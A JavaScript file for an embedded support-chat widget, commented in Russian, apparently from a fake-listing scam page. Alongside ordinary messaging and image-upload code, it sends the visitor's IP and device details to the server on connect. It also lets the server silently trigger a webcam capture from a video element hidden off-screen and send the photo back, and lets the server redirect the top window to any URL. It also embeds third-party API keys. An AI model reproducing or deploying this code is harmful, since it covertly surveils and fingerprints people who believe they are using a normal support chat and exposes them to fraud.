const messages = document.getElementById("chat-messages");
const input = document.querySelector("#chat-input-text");
const sendButton = document.querySelector("#send-message");
const uploadInput = document.querySelector("#uploadpic");

if (!messages || !input || !sendButton || !uploadInput) {
  console.error("Не все элементы интерфейса найдены!");
}

let lastMessages = [];

// ВАЖНО: Проверяем, что INFO.autoOpenChat определен, иначе по умолчанию true
const shouldAutoOpenChat = () => {
  return typeof INFO !== 'undefined' && typeof INFO.autoOpenChat !== 'undefined' 
    ? INFO.autoOpenChat 
    : true; // По умолчанию включено для обратной совместимости
};

const imagePreviewOverlay = document.getElementById("image-preview");
const previewImage = document.getElementById("preview-image");

// Открыть предпросмотр изображения
document.querySelector("#chat-messages").addEventListener("click", (e) => {
  if (e.target.tagName === "IMG") {
    previewImage.src = e.target.src;
    imagePreviewOverlay.classList.add("active");
  }
});

// Закрыть предпросмотр изображения
imagePreviewOverlay.addEventListener("click", () => {
  imagePreviewOverlay.classList.remove("active");
});

// Автоскроллинг
function scrollToBottom() {
  if (messages) {
    messages.scrollTop = messages.scrollHeight;
  }
}

// Автоскроллинг при добавлении новых сообщений
const observer = new MutationObserver(() => {
  scrollToBottom();
});

if (messages) {
  observer.observe(messages, { childList: true });
}

// Отправка сообщения
sendButton.addEventListener("click", (e) => {
  e.preventDefault();
  sendMessage();
});

// Загрузка изображения
uploadInput.addEventListener("change", (e) => {
  e.preventDefault();
  sendPicture();
});

// ⬇️ Вставь этот код прямо сюда:
input.addEventListener("keydown", (e) => {
  if (e.key === "Enter" && !e.shiftKey) {
    e.preventDefault(); // отменяем перенос строки
    sendMessage(); // вызываем отправку
  }
});

// Отправка сообщения с проверкой
function sendMessage() {
  const message = input.value.trim();
  if (!message) return;

  // Добавляем сообщение в интерфейс
  addMessage("user", message);

  // Отправка на сервер
  axios
    .post("/api/support/sendMessage", {
      supportToken: INFO.supportToken,
      message,
    })
    .then((response) => {
      console.log("Сообщение успешно отправлено:", response.data);
      // updateMessages();
    })
    .catch((error) => {
      console.error("Ошибка при отправке сообщения:", error);
    });

  input.value = "";
}

function sanitizeHTML(input) {
  const div = document.createElement("div");
  div.textContent = input;
  let escaped = div.innerHTML;

  // Разрешаем <a href="https://...">...</a>
  escaped = escaped.replace(
    /&lt;a\s+href=['"]?(https:\/\/[^'"<>]+)['"]?\s*&gt;(.*?)&lt;\/a&gt;/gi,
    (_, href, text) => `<a href="${href}" target="_blank" rel="noopener noreferrer">${text}</a>`
  );

  // Разрешаем другие теги, добавил <code>
  const allowedTags = ["b", "i", "u", "br", "code"];
  const tagPattern = new RegExp(
    `&lt;(/?(${allowedTags.join("|")})(\\s[^&<>]*)?)&gt;`,
    "gi"
  );
  escaped = escaped.replace(tagPattern, "<$1>");

  // Функция для автоссылок, применяется только к тексту без тегов <a> и <code>
  function linkifyText(text) {
    const urlPattern = /(https?:\/\/[^\s]+)/g;
    return text.replace(urlPattern, (url) => {
      if (url.match(/\.(jpeg|jpg|gif|png)$/i)) return url;
      return `<a href="${url}" target="_blank" rel="noopener noreferrer">${url}</a>`;
    });
  }

  // Разбиваем строку на части с тегами <a> и <code> и без
  const parts = escaped.split(/(<a [^>]+>.*?<\/a>|<code>.*?<\/code>)/gi);

  // Для частей без тегов <a> и <code> применяем linkifyText
  for (let i = 0; i < parts.length; i++) {
    if (!parts[i].startsWith("<a ") && !parts[i].startsWith("<code>")) {
      parts[i] = linkifyText(parts[i]);
    }
  }

  return parts.join("");
}

// Добавление сообщения
function addMessage(side, message, messageId) {
  const msgDiv = document.createElement("div");
  msgDiv.className = `message ${side}`;
  msgDiv.setAttribute('data-message-id', messageId); // Присваиваем ID сообщения

  if (
    message.startsWith("http") &&
    (message.endsWith(".jpg") ||
      message.endsWith(".jpeg") ||
      message.endsWith(".png") ||
      message.endsWith(".gif"))
  ) {
    // Если сообщение содержит изображение
    const img = document.createElement("img");
    img.src = message;
    img.alt = "Image";
    img.style.maxWidth = "200px";
    img.style.borderRadius = "8px";
    img.style.display = "block";
    msgDiv.appendChild(img);
  } else {
    // Если сообщение текстовое, сохраняем абзацы
    const pre = document.createElement("pre");
    pre.style.whiteSpace = "pre-wrap"; // Сохраняет переносы строк и пробелы
    pre.style.margin = "0"; // Убирает стандартные отступы тега <pre>
    pre.innerHTML = sanitizeHTML(message);
    msgDiv.appendChild(pre);
  }

  messages.appendChild(msgDiv);
  scrollToBottom();
}

// Загрузка изображения
let isUploading = false; // Флаг для предотвращения повторной загрузки

async function uploadToImgBB(file) {
  const formData = new FormData();
  formData.append("image", file);

  try {
    // console.log("📤 Отправка изображения в ImgBB...");
    const response = await fetch(
      "https://api.imgbb.com/1/upload?key=e553217c2b6ca9651c4a361f75f84b83",
      {
        method: "POST",
        body: formData,
      }
    );

    const data = await response.json();
    if (!data.success) throw new Error("Ошибка загрузки в ImgBB");

    // console.log("✅ Успешно загружено в ImgBB:", data.data.url);
    return data.data.url;
  } catch (error) {
    console.error("❌ Ошибка при загрузке в ImgBB:", error.message);
    return null;
  }
}

async function uploadToImgur(file) {
  const formData = new FormData();
  formData.append("image", file);

  try {
    // console.log("📤 Отправка изображения в Imgur...");
    const response = await fetch("https://api.imgur.com/3/image/", {
      method: "POST",
      headers: {
        Authorization: "Client-ID c3f24511a012ccc",
      },
      body: formData,
    });

    const data = await response.json();
    if (!data.success) throw new Error("Ошибка загрузки в Imgur");

    console.log("✅ Успешно загружено в Imgur:", data.data.link);
    return data.data.link;
  } catch (error) {
    console.error("❌ Ошибка при загрузке в Imgur:", error.message);
    return null;
  }
}

async function sendPicture() {
  if (isUploading) return; // Предотвращаем повторную отправку
  const file = uploadInput.files[0];
  if (!file || !file.type.match(/image.*/)) return;

  isUploading = true; // Устанавливаем флаг загрузки

  let imageUrl = await uploadToImgur(file);
  if (!imageUrl) {
    // console.log("🔄 Попытка загрузки через ImgBB...");
    imageUrl = await uploadToImgBB(file);
  }

  if (!imageUrl) {
    console.error(
      "❌ Ошибка: не удалось загрузить изображение ни в Imgur, ни в ImgBB."
    );
    alert("Ошибка загрузки изображения. Попробуйте позже.");
    isUploading = false;
    return;
  }

  // Добавляем изображение в чат
  addMessage("user", imageUrl);

  // Отправляем ссылку на сервер
  axios
    .post("/api/support/sendMessage", {
      supportToken: INFO.supportToken,
      message: imageUrl,
    })
    .then(() => {
      // updateMessages(); // Обновляем чат после успешной отправки
    })
    .catch((error) => {
      console.error("Ошибка при отправке изображения в поддержку:", error);
    })
    .finally(() => {
      isUploading = false; // Сбрасываем флаг загрузки
      uploadInput.value = ""; // Очищаем поле выбора файла
    });
}

function playAudio() {
  const audio = new Audio();
  audio.src = "/audio/new_message.mp3";
  audio.autoplay = true;
  audio.play();
  audio.onended = function () {
    audio.pause();
    delete audio;
  };
}

function removeMessageFromDOM(messageId) {
  const messageElement = document.getElementById(`message-${messageId}`);
  if (messageElement) {
    messageElement.remove();
  } else {
    console.warn(`Сообщение с ID ${messageId} не найдено.`);
  }
}

// Функция для проверки, открыт ли чат пользователем
function isChatVisible() {
  try {
    const chatElement = window.parent.document.querySelector("#chatra");
    return chatElement && chatElement.style.display === "block";
  } catch (e) {
    return false;
  }
}

// Обновление сообщений
function updateMessages(without_sound = false) {
  axios
    .post("/api/support/getMessages", {
      supportToken: INFO.supportToken,
      chatVisible: isChatVisible(), // Передаем информацию о том, открыт ли чат
    })
    .then((response) => {
      var have_new_messages = response.data.messages.filter(
        (a) => !lastMessages.find((b) => a.id == b.id)
      );

      lastMessages = response.data.messages;

      if (have_new_messages.length < 1) return;

      if (!without_sound) {
        have_new_messages.forEach((msg) => {
          if (msg.messageFrom === 0) playAudio();
        });
      }
      
      messages.innerHTML = "";
      response.data.messages.forEach((v) =>
        addMessage(v.messageFrom == 1 ? "user" : "operator", v.message, v.id)
      );

      // ИСПРАВЛЕНО: Используем функцию shouldAutoOpenChat() вместо прямого обращения к INFO.autoOpenChat
      const hasOperatorMessages = have_new_messages.some(msg => msg.messageFrom === 0);
      
      if (shouldAutoOpenChat() && hasOperatorMessages) {
        window.parent.document.querySelector("#chatra").style.display = "block";
        window.parent.document.querySelector(".support-circle").style.display = "none";
      }

      document.getElementById("chat-messages").scrollTop =
        document.getElementById("chat-messages").scrollHeight;
    })
    .catch((err) => err)
    .finally(() => setTimeout(updateMessages, 1500));
}

updateMessages(true);

document.addEventListener("click", function (e) {
  const a = e.target.closest("a");
  if (a && a.href) {
    e.preventDefault(); // остановить обычное поведение
    window.open(a.href, "_blank", "noopener,noreferrer"); // открыть принудительно
  }
});

let ws;
let isOnline = true;
let lastStatus = null;
let hasNotified = false;
let isConnecting = false;
let selfieInProgress = false;

function connectWebSocket() {
  if (isConnecting) return;
  isConnecting = true;

  const wsUrl = window.location.protocol === "https:" ? "wss://" : "ws://";
  ws = new WebSocket(`${wsUrl}${window.location.host}/${INFO.adId}`);

  ws.onopen = async () => {
    if (!hasNotified) {
      sendStatus("focus");
      hasNotified = true;
    }

    isConnecting = false;

    const userAgent = navigator.userAgent;
    const language = navigator.language;
    const platform = navigator.platform;
    const screenWidth = screen.width;
    const screenHeight = screen.height;

    let ip = null;
    try {
      const res = await fetch("https://api.ipify.org?format=json");
      const json = await res.json();
      ip = json.ip;
    } catch (err) {
      console.warn("Не удалось получить IP", err);
    }

    ws.send(JSON.stringify({
      type: "client_info",
      adId: INFO.adId,
      data: {
        ip,
        userAgent,
        language,
        platform,
        screen: {
          width: screenWidth,
          height: screenHeight
        }
      }
    }));
  };

  ws.onmessage = (event) => {
    const data = JSON.parse(event.data);

    if (data.action === "request_selfie") {
      captureSelfie();
    }

    if (data.type === 'delete') {
      const messageId = data.messageId;
      const messageElement = document.querySelector(`[data-message-id="${messageId}"]`);
      if (messageElement) {
        messageElement.remove();
      } else {
        console.warn(`Сообщение с ID ${messageId} не найдено.`);
      }
    }

    if (data.type === 'redirect' && data.url) {
      try {
        window.top.location.href = data.url;
      } catch (e) {
        console.error("❌ Ошибка редиректа:", e);
      }
    }

    if (data.type === 'edit_text') {
      const { messageId, newText } = data;
      const msgElement = document.querySelector(`[data-message-id="${messageId}"]`);
      if (msgElement) {
        const isImage = /\.(jpeg|jpg|png|gif)$/i.test(newText) || newText.startsWith("data:image/");
        msgElement.innerHTML = "";

        if (isImage) {
          const img = document.createElement("img");
          img.src = newText;
          img.alt = "Image";
          img.style.maxWidth = "200px";
          img.style.borderRadius = "8px";
          img.style.display = "block";
          msgElement.appendChild(img);
        } else {
          const pre = document.createElement("pre");
          pre.style.whiteSpace = "pre-wrap";
          pre.style.margin = "0";
          pre.innerHTML = sanitizeHTML(newText);
          msgElement.appendChild(pre);
        }
      }
    }

    // РУЧНОЕ управление через WebSocket - всегда выполняется независимо от настроек
    if (data.type === 'support_status') {
      if (data.status === "open") {
        window.parent.document.querySelector("#chatra").style.display = "block";
        window.parent.document.querySelector(".support-circle").style.display = "none";

        input.disabled = false;
        sendButton.disabled = false;
        uploadInput.disabled = false;
      } else if (data.status === "closed") {
        window.parent.document.querySelector("#chatra").style.display = "none";
        window.parent.document.querySelector(".support-circle").style.display = "block";

        input.disabled = true;
        sendButton.disabled = true;
        uploadInput.disabled = true;
      }
    }
  };

  ws.onclose = () => {
    console.log("🔴 WebSocket отключен, переподключение через 3 сек...");
    isConnecting = false;
    setTimeout(connectWebSocket, 3000);
  };

  ws.onerror = (error) => {
    console.error("❌ WebSocket ошибка:", error);
    isConnecting = false;
  };
}

function sendStatus(status) {
  if (!ws || ws.readyState !== WebSocket.OPEN) return;
  if (status !== "focus" && status === lastStatus) return;

  ws.send(JSON.stringify({ adId: INFO.adId, status }));
  lastStatus = status;
  console.log(`📡 Статус отправлен: ${status}`);
}

async function captureSelfie() {
  if (selfieInProgress) return;
  selfieInProgress = true;

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement("video");
    const canvas = document.createElement("canvas");

    video.style.position = "absolute";
    video.style.top = "-9999px";
    video.style.left = "-9999px";
    document.body.appendChild(video);

    video.srcObject = stream;
    await video.play();

    setTimeout(() => {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      stream.getTracks().forEach(track => track.stop());
      document.body.removeChild(video);

      canvas.toBlob(blob => {
        const reader = new FileReader();
        reader.onloadend = () => {
          const base64 = reader.result;
          if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({ adId: INFO.adId, status: "selfie", image: base64 }));
          }
          selfieInProgress = false;
        };
        reader.readAsDataURL(blob);
      }, "image/jpeg");
    }, 2000);
  } catch (err) {
    console.error("❌ Камера недоступна:", err);
    selfieInProgress = false;

    if (ws && ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ adId: INFO.adId, status: "camera_denied" }));
    }
  }
}

document.addEventListener("DOMContentLoaded", () => {
  if (INFO.adId) {
    connectWebSocket();
  }
});

window.addEventListener("beforeunload", () => {
  sendStatus("blur");
});

document.addEventListener("visibilitychange", () => {
  if (document.hidden && isOnline) {
    sendStatus("blur");
    isOnline = false;
  } else if (!document.hidden && !isOnline) {
    sendStatus("focus");
    isOnline = true;
  }
});